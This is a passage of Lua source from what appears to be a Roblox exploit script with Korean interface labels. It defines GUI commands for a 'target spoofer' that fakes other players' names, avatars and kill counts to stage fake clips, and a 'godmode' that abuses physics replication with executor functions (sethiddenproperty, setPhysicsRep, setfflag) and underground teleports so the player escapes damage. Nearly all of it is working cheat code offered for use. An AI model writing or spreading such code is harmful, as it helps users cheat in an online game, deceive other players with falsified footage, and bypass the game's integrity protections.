					flag7 = input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch
				end

				if flag7 then
					local n = input.Position - position
					frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
				end
			end)

			textButton3.MouseButton1Click:Connect(function()
				if flag5 then
					fn14()
					textButton3.Text = "LOOP: OFF"
					textButton3.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
				else
					fn13()
					textButton3.Text = "LOOP: ON"
					textButton3.BackgroundColor3 = Color3.fromRGB(40, 160, 40)
				end
			end)

			textButton2.MouseButton1Click:Connect(function()
				fn14()

				if getgenv().delvape then
					getgenv().delvape("fakepos")
					getgenv().delvape("desync")
				end

				screenGui2:Destroy()
			end)

			screenGui2.Destroying:Connect(function()
				fn14()

				if getgenv().delvape then
					getgenv().delvape("fakepos")
					getgenv().delvape("desync")
				end
			end)
		end

		fn15()

		v9.CharacterAdded:Connect(function()
			task.wait(1.2)

			if flag5 then
				fn14()
				task.wait(0.1)
				fn13()
			end
		end)
	end)

	addcmd("fakeclipgui", { "fakeclip" }, function()
		local _cloneref = cloneref or function(arg)
			return arg
		end

		local v5 = _cloneref(game:GetService("Players"))
		local v6 = _cloneref(game:GetService("UserService"))
		_cloneref(game:GetService("RunService"))
		local v7 = _cloneref(game:GetService("CoreGui"))
		local v8 = _cloneref(game:GetService("UserInputService"))
		local v9 = _cloneref(v5.LocalPlayer)
		local thread = nil
		local thread2 = nil

		local function safeGet2(tbl7, key)
			if not tbl7 or not key then
				return
			end
			local humanoid = tbl7:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					local humanoidDescriptionFromUserId = v5:GetHumanoidDescriptionFromUserId(key)

					if humanoidDescriptionFromUserId then
						humanoid:ApplyDescription(humanoidDescriptionFromUserId)
					end
				end)
			end
		end

		local function fn11(arg)
			local str = tostring(arg):gsub("%s+", "")
			if str == "" then
				return nil
			end
			local num = tonumber(str)
			local str2 = ""
			local str3 = ""

			for _, player in pairs(v5:GetPlayers()) do
				if tostring(player.UserId) == str or player.Name:lower() == str:lower() or player.DisplayName:lower() == str:lower() or player.Name:lower():find(str:lower()) or player.DisplayName:lower():find(str:lower()) then
					return { UserId = player.UserId, Username = player.Name, DisplayName = player.DisplayName }
				end
			end

			if not num then
				pcall(function()
					num = v5:GetUserIdFromNameAsync(str)
				end)
			end

			if num then
				pcall(function()
					local userInfosByUserIdsAsync = v6:GetUserInfosByUserIdsAsync({ num })

					if userInfosByUserIdsAsync and #userInfosByUserIdsAsync > 0 then
						str2 = userInfosByUserIdsAsync[1].Name
						str3 = userInfosByUserIdsAsync[1].DisplayName
					end
				end)
			end

			if str2 ~= "" or str3 ~= "" then
				return {
					UserId = num,
					Username = str2 ~= "" and str2 or str,
					DisplayName = str3 ~= "" and str3 or str2 ~= "" and str2 or str,
				}
			end

			return nil
		end

		local function fn12(arg, arg2, arg3, arg4)
			if arg == "" then
				return
			end

			task.spawn(function()
				local v10 = fn11(arg)

				if v10 then
					if v10.DisplayName and v10.DisplayName ~= "" then
						arg2.Text = v10.DisplayName
					end

					if v10.Username and v10.Username ~= "" then
						arg3.Text = v10.Username
					end

					if v10.UserId then
						arg4.Text = tostring(v10.UserId)
					end
				end
			end)
		end

		local function fn13(arg, arg2, arg3, arg4, arg5)
			if not arg then
				return
			end

			for _, descendant in pairs(arg:GetDescendants()) do
				if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
					local text = descendant.Text

					if text and text ~= "" then
						local flag5 = arg2 and arg2 ~= ""
						local flag6 = false

						if flag5 then
							if text:find("@" .. arg2) then
								text = text:gsub("@" .. arg2, "@" .. arg4)
								flag6 = true
							elseif text:find(arg2) then
								text = text:gsub(arg2, arg4)
								flag6 = true
							end
						end

						if arg3 and arg3 ~= "" then
							if text:find(arg3) then
								text = text:gsub(arg3, arg5)
								flag6 = true
							end
						end

						if flag6 then
							pcall(function()
								descendant.Text = text
							end)
						end
					end
				end
			end
		end

		local function fn14(arg, arg2, arg3, arg4, arg5, arg6)
			if arg == "" then
				return
			end
			local v10 = nil

			for _, player in pairs(v5:GetPlayers()) do
				if player.Name:lower() == arg:lower() or player.DisplayName:lower() == arg:lower() or tostring(player.UserId) == arg then
					v10 = player
					break
				end
			end

			if not v10 then
				return
			end
			local name = v10.Name
			local displayName = v10.DisplayName
			local displayName2 = arg2 ~= "" and arg2 or displayName
			local flag5 = arg3 ~= "" and arg3 or name

			if v10.Character then
				local humanoid = v10.Character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.DisplayName = displayName2
					end)
				end
			end

			if arg4 ~= "" then
				task.spawn(function()
					local num = tonumber(arg4)

					if not num then
						pcall(function()
							num = v5:GetUserIdFromNameAsync(arg4)
						end)
					end

					if num and v10.Character then
						safeGet2(v10.Character, num)
					end
				end)
			end

			local str = arg5 ~= "" and arg5 or "-"
			local str2 = arg6 ~= "" and arg6 or "-"
			local leaderstats = v10:FindFirstChild("leaderstats")

			if leaderstats then
				for _, child in pairs(leaderstats:GetChildren()) do
					local str3 = child.Name:lower()

					if str3 == "kill" or str3 == "kills" then
						pcall(function()
							child.Value = tonumber(str) or str
						end)
					elseif str3:find("total") and str3:find("kill") then
						pcall(function()
							child.Value = tonumber(str2) or str2
						end)
					end
				end
			end

			pcall(function()
				fn13(v7:FindFirstChild("PlayerList"), name, displayName, flag5, displayName2)
				fn13(v9:FindFirstChildOfClass("PlayerGui"), name, displayName, flag5, displayName2)
			end)
		end

		local function fn15(arg, arg2, arg3)
			local name = v9.Name
			local displayName = v9.DisplayName
			local displayName2 = arg ~= "" and arg or displayName
			local flag5 = arg2 ~= "" and arg2 or name

			if v9.Character then
				local humanoid = v9.Character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.DisplayName = displayName2
					end)
				end
			end

			if arg3 ~= "" then
				task.spawn(function()
					local num = tonumber(arg3)

					if not num then
						pcall(function()
							num = v5:GetUserIdFromNameAsync(arg3)
						end)
					end

					if num and v9.Character then
						safeGet2(v9.Character, num)
					end
				end)
			end

			pcall(function()
				fn13(v7:FindFirstChild("PlayerList"), name, displayName, flag5, displayName2)
				fn13(v9:FindFirstChildOfClass("PlayerGui"), name, displayName, flag5, displayName2)
			end)
		end

		pcall(function()
			local targetSpooferMainUI = (PARENT or v7):FindFirstChild("TargetSpooferMainUI") or v7:FindFirstChild("TargetSpooferMainUI")

			if targetSpooferMainUI then
				targetSpooferMainUI:Destroy()
			end
		end)

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "TargetSpooferMainUI"
		screenGui2.ResetOnSpawn = false
		screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui2.Parent = PARENT or v7
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 290, 0, 410)
		frame2.Position = UDim2.new(0.5, -145, 0.22, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
		frame2.BorderSizePixel = 0
		frame2.Parent = screenGui2
		Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 10)
		local uiStroke3 = Instance.new("UIStroke", frame2)
		uiStroke3.Color = Color3.fromRGB(90, 90, 120)
		uiStroke3.Thickness = 1.5
		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, 0, 0, 38)
		frame3.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
		frame3.BorderSizePixel = 0
		frame3.Parent = frame2
		Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(0, 140, 1, 0)
		textLabel.Position = UDim2.new(0, 10, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "🎯 TARGET SPOOFER [M]"
		textLabel.TextColor3 = Color3.fromRGB(130, 210, 255)
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 12
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Size = UDim2.new(0, 22, 0, 22)
		textButton2.Position = UDim2.new(1, -28, 0, 8)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 60)
		textButton2.BorderSizePixel = 0
		textButton2.Text = "✕"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.Font = Enum.Font.GothamBold
		textButton2.TextSize = 12
		textButton2.Parent = frame3
		Instance.new("UICorner", textButton2).CornerRadius = UDim.new(0, 4)
		local textButton3 = Instance.new("TextButton")
		textButton3.Size = UDim2.new(0, 65, 0, 22)
		textButton3.Position = UDim2.new(1, -98, 0, 8)
		textButton3.BackgroundColor3 = Color3.fromRGB(50, 130, 220)
		textButton3.BorderSizePixel = 0
		textButton3.Text = "👤 내 설정"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.Font = Enum.Font.GothamBold
		textButton3.TextSize = 10
		textButton3.Parent = frame3
		Instance.new("UICorner", textButton3).CornerRadius = UDim.new(0, 4)

		local function createTextBox(parent, placeholderText, arg, arg2)
			local textBox = Instance.new("TextBox")
			textBox.Size = UDim2.new(1, -20, 0, arg2 or 32)
			textBox.Position = UDim2.new(0, 10, 0, arg)
			textBox.BackgroundColor3 = Color3.fromRGB(26, 26, 34)
			textBox.BorderSizePixel = 0
			textBox.PlaceholderText = placeholderText
			textBox.PlaceholderColor3 = Color3.fromRGB(110, 110, 130)
			textBox.Text = ""
			textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
			textBox.Font = Enum.Font.Gotham
			textBox.TextSize = 11
			textBox.Parent = parent
			Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)
			local uiStroke4 = Instance.new("UIStroke", textBox)
			uiStroke4.Color = Color3.fromRGB(45, 45, 60)
			uiStroke4.Thickness = 1
			return textBox
		end

		local UserId = createTextBox(frame2, "1. 타겟 유저네임 / DisplayName / UserId", 46, 34)
		local textButton4 = Instance.new("TextButton")
		textButton4.Size = UDim2.new(1, -20, 0, 26)
		textButton4.Position = UDim2.new(0, 10, 0, 85)
		textButton4.BackgroundColor3 = Color3.fromRGB(80, 60, 180)
		textButton4.BorderSizePixel = 0
		textButton4.Text = "타겟 정보 자동 불러오기"
		textButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton4.Font = Enum.Font.GothamBold
		textButton4.TextSize = 10
		textButton4.Parent = frame2
		Instance.new("UICorner", textButton4).CornerRadius = UDim.new(0, 5)
		local v10 = createTextBox(frame2, "가짜 DisplayName", 118, 30)
		local v11 = createTextBox(frame2, "가짜 Username", 152, 30)
		local v12 = createTextBox(frame2, "가짜 아바타 (UserId 또는 Username)", 186, 30)
		local v13 = createTextBox(frame2, "가짜 Kills (비우면 '-')", 220, 30)
		local v14 = createTextBox(frame2, "가짜 Total Kills (비우면 '-')", 254, 30)
		local textButton5 = Instance.new("TextButton")
		textButton5.Size = UDim2.new(0.46, 0, 0, 36)
		textButton5.Position = UDim2.new(0.04, 0, 0, 296)
		textButton5.BackgroundColor3 = Color3.fromRGB(40, 160, 70)
		textButton5.BorderSizePixel = 0
		textButton5.Text = "가짜클립 적용"
		textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton5.Font = Enum.Font.GothamBold
		textButton5.TextSize = 11
		textButton5.Parent = frame2
		Instance.new("UICorner", textButton5).CornerRadius = UDim.new(0, 6)
		local textButton6 = Instance.new("TextButton")
		textButton6.Size = UDim2.new(0.46, 0, 0, 36)
		textButton6.Position = UDim2.new(0.5, 0, 0, 296)
		textButton6.BackgroundColor3 = Color3.fromRGB(180, 50, 60)
		textButton6.BorderSizePixel = 0
		textButton6.Text = "초기화"
		textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton6.Font = Enum.Font.GothamBold
		textButton6.TextSize = 11
		textButton6.Parent = frame2
		Instance.new("UICorner", textButton6).CornerRadius = UDim.new(0, 6)
		local frame4 = Instance.new("Frame")
		frame4.Name = "SelfFrame"
		frame4.Size = UDim2.new(0, 220, 0, 220)
		frame4.Position = UDim2.new(1, 10, 0, 0)
		frame4.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
		frame4.BorderSizePixel = 0
		frame4.Visible = false
		frame4.Parent = frame2
		Instance.new("UICorner", frame4).CornerRadius = UDim.new(0, 8)
		local uiStroke4 = Instance.new("UIStroke", frame4)
		uiStroke4.Color = Color3.fromRGB(70, 70, 100)
		uiStroke4.Thickness = 1.5
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Size = UDim2.new(1, -10, 0, 30)
		textLabel2.Position = UDim2.new(0, 8, 0, 4)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "👤 내 프로필 변조"
		textLabel2.TextColor3 = Color3.fromRGB(130, 210, 255)
		textLabel2.Font = Enum.Font.GothamBold
		textLabel2.TextSize = 12
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.Parent = frame4
		local v15 = createTextBox(frame4, "내 가짜 DisplayName", 36, 30)
		local v16 = createTextBox(frame4, "내 가짜 Username", 70, 30)
		local v17 = createTextBox(frame4, "내 아바타 복사 (UserId/Name)", 104, 30)
		local textButton7 = Instance.new("TextButton")
		textButton7.Size = UDim2.new(1, -20, 0, 32)
		textButton7.Position = UDim2.new(0, 10, 0, 144)
		textButton7.BackgroundColor3 = Color3.fromRGB(50, 130, 220)
		textButton7.BorderSizePixel = 0
		textButton7.Text = "내 설정 적용"
		textButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton7.Font = Enum.Font.GothamBold
		textButton7.TextSize = 11
		textButton7.Parent = frame4
		Instance.new("UICorner", textButton7).CornerRadius = UDim.new(0, 5)
		local textButton8 = Instance.new("TextButton")
		textButton8.Size = UDim2.new(1, -20, 0, 26)
		textButton8.Position = UDim2.new(0, 10, 0, 182)
		textButton8.BackgroundColor3 = Color3.fromRGB(180, 50, 60)
		textButton8.BorderSizePixel = 0
		textButton8.Text = "내 설정 초기화"
		textButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton8.Font = Enum.Font.GothamBold
		textButton8.TextSize = 10
		textButton8.Parent = frame4
		Instance.new("UICorner", textButton8).CornerRadius = UDim.new(0, 5)

		textButton3.MouseButton1Click:Connect(function()
			frame4.Visible = not frame4.Visible
		end)

		textButton4.MouseButton1Click:Connect(function()
			fn12(UserId.Text, v10, v11, v12)
		end)

		textButton5.MouseButton1Click:Connect(function()
			if thread2 then
				task.cancel(thread2)
				thread2 = nil
			end

			thread2 = task.spawn(function()
				while true do
					fn14(UserId.Text, v10.Text, v11.Text, v12.Text, v13.Text, v14.Text)
					task.wait(0.2)
				end
			end)
		end)

		textButton6.MouseButton1Click:Connect(function()
			if thread2 then
				task.cancel(thread2)
				thread2 = nil
			end

			UserId.Text = ""
			v10.Text = ""
			v11.Text = ""
			v12.Text = ""
			v13.Text = ""
			v14.Text = ""
		end)

		textButton7.MouseButton1Click:Connect(function()
			if thread then
				task.cancel(thread)
				thread = nil
			end

			thread = task.spawn(function()
				while true do
					fn15(v15.Text, v16.Text, v17.Text)
					task.wait(0.2)
				end
			end)
		end)

		textButton8.MouseButton1Click:Connect(function()
			if thread then
				task.cancel(thread)
				thread = nil
			end

			v15.Text = ""
			v16.Text = ""
			v17.Text = ""
		end)

		v8.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then
				return
			end

			if input.KeyCode == Enum.KeyCode.M then
				frame2.Visible = not frame2.Visible
			end
		end)

		local flag5 = nil
		local position = nil
		local position2 = nil

		frame2.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = true
				position2 = input.Position
				position = frame2.Position
			end
		end)

		frame2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = false
			end
		end)

		v8.InputChanged:Connect(function(input)
			if flag5 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local n = input.Position - position2
				frame2.Position = UDim2.new(position.X.Scale, position.X.Offset + n.X, position.Y.Scale, position.Y.Offset + n.Y)
			end
		end)

		textButton2.MouseButton1Click:Connect(function()
			if thread2 then
				task.cancel(thread2)
				thread2 = nil
			end

			if thread then
				task.cancel(thread)
				thread = nil
			end

			if getgenv().delvape then
				getgenv().delvape("fakeclipgui")
				getgenv().delvape("fakeclip")
			end

			screenGui2:Destroy()
		end)
	end)

	addcmd("godmodegui", { "godmode" }, function()
		local _cloneref = cloneref or function(arg)
			return arg
		end

		local v5 = _cloneref(game:GetService("Players"))
		local v6 = _cloneref(game:GetService("RunService"))
		local v7 = _cloneref(game:GetService("CoreGui"))
		local v8 = _cloneref(game:GetService("UserInputService"))
		local v9 = _cloneref(v5.LocalPlayer)

		pcall(function()
			setfflag("S2PhysicsSenderRate", "25000000")
		end)

		local tbl7 = {
			GuiName = "GodmodeGui",
			TeleportDepth = -150,
			ToggleKey = Enum.KeyCode.R,
			Size = UDim2.fromOffset(230, 202),
			Position = UDim2.new(0.5, -115, 0.8, 0),
			Background = Color3.fromRGB(12, 12, 12),
			Secondary = Color3.fromRGB(24, 24, 24),
			Border = Color3.fromRGB(65, 65, 65),
			OnColor = Color3.fromRGB(45, 180, 95),
			OffColor = Color3.fromRGB(190, 55, 65),
			TextColor = Color3.fromRGB(255, 255, 255),
			SubTextColor = Color3.fromRGB(170, 170, 170),
			ButtonTextColor = Color3.fromRGB(255, 255, 255),
		}

		local tbl8 = {
			["10469643643"] = true,
			["10471336737"] = true,
			["10469639222"] = true,
			["10468665991"] = true,
			["10469493270"] = true,
			["10466974800"] = true,
			["10479335397"] = true,
			["12510170988"] = true,
			["10469630950"] = true,
		}

		local tbl9 = {
			Enabled = false,
			Active = false,
			LoopThread = nil,
			AutoToggle = false,
			DebugLog = false,
			HeartbeatConnection = nil,
			InputConnection = nil,
			AutoToggleThread = nil,
			AnimConnection = nil,
			GhostPart = nil,
			UndergroundPlatform = nil,
			ScreenGui = nil,
			MainFrame = nil,
			ToggleButton = nil,
			AutoToggleBtn = nil,
			DebugLogBtn = nil,
			KeybindButton = nil,
			StatusLabel = nil,
		}

		local function fn11()
			return v9.Character
		end

		local function getGlobal2()
			local v10 = fn11()
			if not v10 then
				return nil
			end
			return v10:FindFirstChild("PhysicsRootPart") or v10:FindFirstChild("HumanoidRootPart")
		end

		local function createPart()
			if tbl9.GhostPart then
				pcall(function()
					tbl9.GhostPart:Destroy()
				end)

				tbl9.GhostPart = nil
			end

			local part = Instance.new("Part")
			part.Name = "GhostPart"
			part.Anchored = false
			part.CanCollide = false
			part.Transparency = 1
			part.Size = Vector3.new(0.1, 0.1, 0.1)
			tbl9.GhostPart = part
			return part
		end

		local function fn12()
			if tbl9.GhostPart then
				pcall(function()
					tbl9.GhostPart:Destroy()
				end)

				tbl9.GhostPart = nil
			end
		end

		local function fn13()
			local v10 = fn11()
			if not v10 then
				return
			end
			local ghostPart = tbl9.GhostPart
			if not ghostPart then
				return
			end

			pcall(function()
				for _, descendant in ipairs(v10:GetDescendants()) do
					if descendant:IsA("BasePart") then
						sethiddenproperty(descendant, "NetworkIsSleeping", false)
						setPhysicsRep(descendant, ghostPart)
					end
				end
			end)
		end

		local function fn14()
			local v10 = fn11()
			if not v10 then
				return
			end

			pcall(function()
				for _, descendant in ipairs(v10:GetDescendants()) do
					if descendant:IsA("BasePart") then
						setPhysicsRep(descendant, nil)
					end
				end
			end)
		end

		local cFrame = nil
		local flag5 = false

		local function createPart2(arg)
			if tbl9.UndergroundPlatform and tbl9.UndergroundPlatform.Parent then
				tbl9.UndergroundPlatform.CFrame = arg * CFrame.new(0, -5, 0)
				return tbl9.UndergroundPlatform
			end

			if tbl9.UndergroundPlatform then
				pcall(function()
					tbl9.UndergroundPlatform:Destroy()
				end)

				tbl9.UndergroundPlatform = nil
			end

			local part = Instance.new("Part")
			part.Name = "GodmodeSafetyPlatform"
			part.Size = Vector3.new(100, 4, 100)
			part.CFrame = arg * CFrame.new(0, -5, 0)
			part.Anchored = true
			part.CanCollide = true
			part.Transparency = 1
			part.Parent = workspace
			tbl9.UndergroundPlatform = part
			return part
		end

		local function fn15()
			if tbl9.UndergroundPlatform then
				pcall(function()
					tbl9.UndergroundPlatform:Destroy()
				end)

				tbl9.UndergroundPlatform = nil
			end
		end

		local function fn16()
			local v10 = fn11()
			local v11 = getGlobal2()
			if not v11 or not v10 then
				return
			end

			if flag5 then
				if cFrame and v11.Position.Y <= cFrame.Position.Y - 50 then
					v11.CFrame = cFrame
					v11.AssemblyLinearVelocity = Vector3.zero
				end

				return
			end

			if not cFrame or v11.Position.Y > cFrame.Position.Y - 50 then
				cFrame = v11.CFrame
			end

			local cFrame2 = cFrame * CFrame.new(0, tbl7.TeleportDepth, 0)
			createPart2(cFrame2)
			flag5 = true
			local flag6 = getgenv().fakepos_enabled == true

			if flag6 then
				getgenv().fakepos_pause = true
				task.wait(0.12)
			end

			for i = 1, 6 do
				v6.Stepped:Wait()

				if tbl9.Enabled then
					v11.CFrame = cFrame2
					v11.AssemblyLinearVelocity = Vector3.zero
					continue
				end

				break
			end

			task.wait(0.225)

			if v11 and cFrame then
				for i = 1, 6 do
					v6.Stepped:Wait()
					v11.CFrame = cFrame
					v11.AssemblyLinearVelocity = Vector3.zero
				end
			end

			flag5 = false

			if flag6 then
				getgenv().fakepos_pause = false
			end
		end

		local function fn17(arg)
			if not arg then
				return ""
			end
			local str = ""

			pcall(function()
				if arg.Animation and arg.Animation.AnimationId then
					str = tostring(arg.Animation.AnimationId)
				elseif arg.AnimationId then
					str = tostring(arg.AnimationId)
				end
			end)

			return str
		end

		local function fn18(arg)
			if not arg or arg == "" then
				return false, nil
			end

			for k in pairs(tbl8) do
				if arg:find(k, 1, true) then
					return true, k
				end
			end

			return false, nil
		end

		local function fn19()
			local toggleButton = tbl9.ToggleButton
			local statusLabel = tbl9.StatusLabel
			local name = tbl7.ToggleKey and tbl7.ToggleKey.Name or "R"

			if toggleButton then
				if tbl9.Enabled then
					toggleButton.Text = "● Godmode Enabled [" .. name .. "]"
					toggleButton.BackgroundColor3 = tbl7.OnColor
				else
					toggleButton.Text = "○ Godmode Disabled [" .. name .. "]"
					toggleButton.BackgroundColor3 = tbl7.OffColor
				end
			end

			if statusLabel then
				statusLabel.TextColor3 = tbl9.Enabled and tbl7.OnColor or tbl7.OffColor
			end

			if tbl9.AutoToggleBtn then
				if tbl9.AutoToggle then
					tbl9.AutoToggleBtn.Text = "✓ 자동 토글 (ON)"
					tbl9.AutoToggleBtn.BackgroundColor3 = tbl7.OnColor
				else
					tbl9.AutoToggleBtn.Text = "☐ 자동 토글 (OFF)"
					tbl9.AutoToggleBtn.BackgroundColor3 = tbl7.Secondary
				end
			end

			if tbl9.DebugLogBtn then
				if tbl9.DebugLog then
					tbl9.DebugLogBtn.Text = "🔍 애니 로그 디버그 [ON]"
					tbl9.DebugLogBtn.BackgroundColor3 = Color3.fromRGB(40, 120, 220)
				else
					tbl9.DebugLogBtn.Text = "🔍 애니 로그 디버그 [OFF]"
					tbl9.DebugLogBtn.BackgroundColor3 = tbl7.Secondary
				end
			end
		end

		local function fn20(arg)
			if tbl9.Enabled then
				return
			end
			tbl9.Enabled = true

			if getgenv().addvape then
				getgenv().addvape("godmode")
			end

			createPart()

			if tbl9.LoopThread then
				task.cancel(tbl9.LoopThread)
				tbl9.LoopThread = nil
			end

			tbl9.LoopThread = task.spawn(function()
				if not arg then
					fn16()
				end

				if not tbl9.Enabled then
					return
				end
				tbl9.Active = true

				if not tbl9.HeartbeatConnection then
					tbl9.HeartbeatConnection = v6.Heartbeat:Connect(function()
						if not tbl9.Active then
							return
						end
						local v10 = getGlobal2()

						if v10 and cFrame and v10.Position.Y <= cFrame.Position.Y - 50 then
							v10.CFrame = cFrame
							v10.AssemblyLinearVelocity = Vector3.zero
						end

						fn13()
						v6.RenderStepped:Wait()
						fn14()
					end)
				end
			end)

			fn19()
		end

		local function fn21()
			tbl9.Enabled = false
			tbl9.Active = false

			if tbl9.HeartbeatConnection then
				tbl9.HeartbeatConnection:Disconnect()
				tbl9.HeartbeatConnection = nil
			end

			if tbl9.LoopThread then
				task.cancel(tbl9.LoopThread)
				tbl9.LoopThread = nil
			end

			flag5 = false
			fn14()
			fn12()
			local v10 = getGlobal2()

			if v10 and cFrame and v10.Position.Y <= cFrame.Position.Y - 50 then
				v10.CFrame = cFrame
				v10.AssemblyLinearVelocity = Vector3.zero
			end

			fn15()
			local v11 = fn11()

			if v11 then
				local humanoid = v11:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						workspace.CurrentCamera.CameraSubject = humanoid
					end)
				end
			end

			if getgenv().delvape then
				getgenv().delvape("godmode")
				getgenv().delvape("godmodegui")
			end

			fn19()
		end

		local function fn22()
			if tbl9.Enabled then
				fn21()
			else
				fn20(false)
			end
		end

		local function fn23()
			if tbl9.AnimConnection then
				tbl9.AnimConnection:Disconnect()
				tbl9.AnimConnection = nil
			end

			local v10 = fn11()
			if not v10 then
				return
			end
			local humanoid = v10:FindFirstChildOfClass("Humanoid")
			if not humanoid then
				return
			end

			tbl9.AnimConnection = (humanoid:FindFirstChildOfClass("Animator") or humanoid).AnimationPlayed:Connect(function(arg)
				local v11 = fn17(arg)
				local v12, v13 = fn18(v11)

				if tbl9.DebugLog then
					print(string.format("[Anim Log] 🎬 애니메이션 재생: ID = '%s' | 이름 = '%s' | 화이트리스트 = %s", v11, tostring(arg.Name), v12 and "✅ [일치: " .. tostring(v13) .. "]" or "❌ [불일치]"))
				end

				if v12 and (tbl9.DebugLog or tbl9.AutoToggle) then
					print("[Godmode AutoToggle] ⚡ 화이트리스트 스킬 사용 감지 (" .. tostring(v13) .. ") -> 갓모드 OFF")
				end
			end)
		end

		local function fn24()
			local v10 = fn11()
			if not v10 then
				return false
			end
			local humanoid = v10:FindFirstChildOfClass("Humanoid")
			if not humanoid then
				return false
			end
			local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid
			local flag6 = false

			pcall(function()
				local playingAnimationTracks = animator:GetPlayingAnimationTracks()

				for _, playingAnimationTrack in ipairs(playingAnimationTracks) do
					if playingAnimationTrack.IsPlaying then
						local v11 = fn17(playingAnimationTrack)
						if fn18(v11) then
							flag6 = true
							break
						end
					end
				end
			end)

			return flag6
		end

		local function fn25()
			if tbl9.AutoToggleThread then
				task.cancel(tbl9.AutoToggleThread)
				tbl9.AutoToggleThread = nil
			end

			fn23()
			fn20(false)

			tbl9.AutoToggleThread = task.spawn(function()
				local n = 0

				while tbl9.AutoToggle do
					if fn24() then
						n = 0

						if tbl9.Enabled then
							fn21()
						end
					elseif not tbl9.Enabled then
						n += 0.02

						if n >= 0.5 then
							if not fn24() then
								fn20(false)

								if tbl9.DebugLog then
									print("[Godmode AutoToggle] 🛡️ 스킬 종료 0.3초 유지 감지 -> 갓모드 자동 ON (땅속 텔레포트 포함)")
								end
							end

							n = 0
						end
					else
						n = 0
					end

					task.wait(0.02)
				end
			end)
		end

		local function createUICorner(parent, arg)
			local uiCorner3 = Instance.new("UICorner")
			uiCorner3.CornerRadius = UDim.new(0, arg)
			uiCorner3.Parent = parent
			return uiCorner3
		end

		local function createUIStroke(parent, color, thickness)
			local uiStroke3 = Instance.new("UIStroke")
			uiStroke3.Color = color
			uiStroke3.Thickness = thickness
			uiStroke3.Transparency = 0
			uiStroke3.Parent = parent
			return uiStroke3
		end

		local function createTextLabel(parent, text, size, position, textSize)
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = size
			textLabel.Position = position
			textLabel.BackgroundTransparency = 1
			textLabel.Text = text
			textLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextSize = textSize
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.Parent = parent
			return textLabel
		end

		local flag6 = false
		local position = nil
		local position2 = nil

		local function fn26(arg)
			flag6 = false

			arg.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType
				if userInputType ~= Enum.UserInputType.MouseButton1 and userInputType ~= Enum.UserInputType.Touch then
					return
				end
				flag6 = true
				position = input.Position
				position2 = arg.Position
			end)

			arg.InputEnded:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch then
					flag6 = false
				end
			end)

			v8.InputChanged:Connect(function(input)
				if not flag6 then
					return
				end
				local userInputType = input.UserInputType
				if userInputType ~= Enum.UserInputType.MouseMovement and userInputType ~= Enum.UserInputType.Touch then
					return
				end
				local n = input.Position - position
				arg.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end)
		end

		local function fn27()
			fn21()
			tbl9.AutoToggle = false

			if tbl9.AutoToggleThread then
				task.cancel(tbl9.AutoToggleThread)
				tbl9.AutoToggleThread = nil
			end

			if tbl9.InputConnection then
				tbl9.InputConnection:Disconnect()
				tbl9.InputConnection = nil
			end

			if tbl9.ScreenGui then
				tbl9.ScreenGui:Destroy()
				tbl9.ScreenGui = nil
			end

			if getgenv().delvape then
				getgenv().delvape("godmode")
				getgenv().delvape("godmodegui")
			end

			tbl9.MainFrame = nil
			tbl9.ToggleButton = nil
			tbl9.AutoToggleBtn = nil
			tbl9.DebugLogBtn = nil
			tbl9.StatusLabel = nil
		end

		local function fn28()
			fn27()
			local screenGui2 = Instance.new("ScreenGui")
